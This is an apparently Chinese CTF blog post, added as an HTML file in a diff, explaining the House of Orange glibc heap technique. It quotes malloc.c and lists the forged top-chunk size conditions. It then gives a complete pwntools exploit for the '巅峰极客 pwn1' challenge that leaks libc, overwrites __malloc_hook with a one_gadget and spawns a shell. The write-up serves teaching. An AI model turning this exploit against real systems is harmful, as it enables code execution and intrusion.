@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        House of Orange - 萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+     你若盛开，清风自来！ 
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg">
+        </div>
+        <div class="name">
+            萝卜
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#源码分析"><span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#伪造的-top-chunk-size-的要点"><span class="toc-text">伪造的 top chunk size 的要点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#巅峰极客-pwn1"><span class="toc-text">巅峰极客 pwn1</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        House of Orange
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-10-20 20:50:00</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content no-indent">
+        <p>这种利用手法可以把一个<code>chunk</code>给释放掉,过程没有使用到<code>free</code>函数</p>
+<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>在调用<code>malloc</code>分配<code>chunk</code>的时候，会首先看<code>fast bin</code>、<code>small bin</code>、<code>large bin</code>、<code>unsorted bin</code>里是否有合适的chunk来分配，如果都没有的话，就会从top chunk中分配</p>
+<p>但是，当top chunk也不够的时候，就会执行以下代码：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">         Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">          <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
+<p><code>malloc.c:2260</code>:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   sysmalloc handles malloc cases requiring more memory from the system.</span></span><br><span class="line"><span class="comment">   On entry, it is assumed that av-&gt;top does not have enough</span></span><br><span class="line"><span class="comment">   space to service request for nb bytes, thus requiring that av-&gt;top</span></span><br><span class="line"><span class="comment">   be extended or replaced.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *</span><br><span class="line">sysmalloc (INTERNAL_SIZE_T nb, mstate av)</span><br><span class="line">&#123;</span><br><span class="line">					   ……………………</span><br><span class="line">                      <span class="comment">/* If possible, release the rest. */</span></span><br><span class="line">                      <span class="keyword">if</span> (old_size &gt;= MINSIZE)</span><br><span class="line">                        &#123;</span><br><span class="line">                          _int_free (av, old_top, <span class="number">1</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="comment">/* if (av !</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到，会调用<code>_int_free</code>函数把原来的<code>top chunk</code>给free掉</p>
+<h3 id="伪造的-top-chunk-size-的要点"><a href="#伪造的-top-chunk-size-的要点" class="headerlink" title="伪造的 top chunk size 的要点"></a>伪造的 top chunk size 的要点</h3><ul>
+<li>伪造的 size 必须要对齐到内存页</li>
+<li>size 要大于 MINSIZE(0x10)</li>
+<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
+<li>size 的 prev inuse 位必须为 1</li>
+</ul>
+<blockquote>
+<p>内存页对齐：0x602020+0x20fe0=0x623000，可以伪造成0x0fe1,0x1fe1,0x2fe1……</p>
+</blockquote>
+<h2 id="巅峰极客-pwn1"><a href="#巅峰极客-pwn1" class="headerlink" title="巅峰极客 pwn1"></a>巅峰极客 pwn1</h2><p>保护全开，<code>free</code>和<code>show</code>函数都只能利用一次,<code>edit</code>中存在堆溢出，最多可以溢出8个字节，可以修改到<code>top chunk</code>,然后利用<code>House of Orange</code>使<code>unsorted bin</code>中出现<code>chunk</code>，然后泄露<code>libc</code>，然后可造成<code>UAF</code>，修改<code>__free_hook</code>即可获取<code>shell</code></p>
+<p>Exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">file_name = <span class="string">'./pwn'</span></span><br><span class="line">libc_name = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">ip = <span class="string">'8f383c80.gamectf.com'</span></span><br><span class="line">prot = <span class="string">'40079'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    r = process(file_name)</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    r = remote(ip,int(prot))</span><br><span class="line">    libc = ELF(libc_name)</span><br><span class="line"></span><br><span class="line">file = ELF(file_name)</span><br><span class="line"></span><br><span class="line">sl = <span class="keyword">lambda</span> x : r.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x : r.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : r.sendlineafter(x,y)</span><br><span class="line">rud = <span class="keyword">lambda</span> x : r.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x : r.recvuntil(x)</span><br><span class="line">li = <span class="keyword">lambda</span> name,x : log.info(name+<span class="string">':'</span>+hex(x))</span><br><span class="line">ri = <span class="keyword">lambda</span>  : r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(chunk_size,value)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Size &gt; '</span>)</span><br><span class="line">    sl(str(chunk_size))</span><br><span class="line">    ru(<span class="string">'Content &gt; '</span>)</span><br><span class="line">    sl(value)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(size,value)</span>:</span></span><br><span class="line">    ru(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'Size &gt; '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'Content &gt; '</span>)</span><br><span class="line">    sd(value)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(r)</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">"What's your name?"</span>)</span><br><span class="line">sl(<span class="string">"wxm"</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x38</span>,<span class="string">"aaa"</span>)</span><br><span class="line">edit(<span class="number">0x40</span>,<span class="string">"a"</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xfc1</span>))</span><br><span class="line">create(<span class="number">0xf00</span>,<span class="string">"bbb"</span>)</span><br><span class="line">create(<span class="number">0xc0</span>,<span class="string">"ccc"</span>)</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">""</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">"\x7f\x00\x00"</span>)</span><br><span class="line"></span><br><span class="line">li(<span class="string">"free"</span>,libc.symbols[<span class="string">'free'</span>])</span><br><span class="line">libc_base = u64(r.recv(<span class="number">8</span>))<span class="number">-0x3c4bf8</span></span><br><span class="line">li(<span class="string">"libc_base"</span>,libc_base)</span><br><span class="line">__malloc_hook = libc_base + libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">delete()</span><br><span class="line">edit(<span class="number">0x68</span>,p64(__malloc_hook<span class="number">-0x23</span>))</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">""</span>)</span><br><span class="line">one_gg = <span class="number">0xf02a4</span>+libc_base</span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">"aaa"</span>+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one_gg))</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">ru(<span class="string">'Your choice &gt; '</span>)</span><br><span class="line">sl(<span class="string">'1'</span>)</span><br><span class="line">ru(<span class="string">'Size &gt; '</span>)</span><br><span class="line">sl(<span class="string">"32"</span>)</span><br><span class="line">ri()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216 execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526a execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf02a4 execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1147 execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        转发请备注<a href="“https://luobuming.github.io”">一筐萝卜</a>的个人博客 <br>
+        本站总访问量<span id="busuanzi_value_site_pv"></span>次
+       </p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
